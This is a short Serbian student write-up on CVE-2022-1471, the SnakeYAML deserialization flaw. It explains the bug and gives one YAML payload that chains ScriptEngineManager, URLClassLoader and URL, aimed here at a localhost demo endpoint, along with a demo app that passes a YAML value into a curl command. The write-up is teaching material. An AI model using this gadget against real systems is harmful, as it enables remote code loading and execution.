## CVE-2022-1471

Autor: Mihajlo Orlovic SV13/2022

Glavna stvar koja se eksploituje je nepaznja autora `SnakeYAML` biblioteke, koji su dozvolili pretvaranje arbitrarnog yaml-a u Java klase.

Jedan primer malicioznoj yaml-a u demo aplikaciji je:

```yml
weather:
  location:
    !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://localhost:8080/api/weather"]]]]
```

Demo aplikacija radi `curl wttr.in/[location]?format=3`, a `location` dobija iz yml-a i rezultat se prikazuje na frontu.


`!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://localhost:8080/api/weather"]]]]` kreira java `ScriptEngineManager` koja poziva `URLCLassLoader` koji instancira `URL` klasu koja podrazumevano pinguje dat url. Demo aplikacija sadrzi i endpoint na `GET /api/weather/` koji sluzi cisto da se demonstrira pozivanje urla preko parsiranja yaml-a.
